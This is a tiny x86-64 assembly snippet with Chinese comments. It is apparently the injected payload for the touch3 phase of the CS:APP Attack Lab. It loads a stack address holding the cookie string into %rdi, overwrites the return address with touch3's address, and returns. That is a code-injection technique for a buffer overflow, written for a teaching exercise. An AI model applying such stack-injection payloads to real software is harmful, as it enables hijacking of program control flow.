# 先将 cookie 的 ASCII 编码放到指定内存地址
# 将上面的内存地址放到 %rdi
# 设置 touch3 的内存地址到 %rsp，然后 ret
    movq $0x5561dc78,%rdi
    movq $0x4018fa,(%rsp)
    ret
